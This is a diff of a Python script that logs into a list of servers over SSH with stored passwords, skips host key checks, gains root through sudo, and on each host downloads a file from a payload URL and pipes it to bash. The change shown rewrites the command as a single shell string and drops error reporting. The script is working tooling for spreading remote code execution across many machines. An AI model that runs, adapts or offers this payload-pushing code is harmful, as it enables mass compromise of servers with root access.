@@ -35,38 +35,13 @@ def get_servers():
 
 
 def push_payload(ip):
-    out = subprocess.run(
-        [
-            "sshpass",
-            "-p",
-            ctx.password,
-            "ssh",
-            "-oStrictHostKeyChecking=no",
-            f"{ctx.username}@{ip}",
-            # download payload
-            "echo",
-            ctx.password,
-            "|",
-            "sudo",
-            "-S",
-            "bash",
-            "-c",
-            '"apt-get',
-            "install",
-            "curl",
-            "-y",
-            "&&",
-            "curl",
-            "-s",
-            ctx.payload_url,
-            "|",
-            'bash"',
-        ],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
+    out = subprocess.getoutput(
+        f"""
+sshpass -p {ctx.password} ssh -oStrictHostKeyChecking=no {ctx.username}@{ip} "echo {ctx.password} | sudo -S bash -c \\"apt-get install curl -y && curl -s {ctx.payload_url} | bash\\""
+"""
     )
 
-    return out.stdout, out.stderr
+    return out
 
 
 def main():
@@ -81,10 +56,8 @@ def main():
     print(f"[  LOG  ] Servers IPs: {', '.join(ips)}")
 
     for i in ips:
-        out, err = push_payload(i)
+        out = push_payload(i)
         print(f"[  LOG  ] {i}: Pushing payload")
-        if err:
-            print(f"[  ERROR  ] {err}")
         if out:
             print(f"[  LOG  ] {i}: {out}")
 
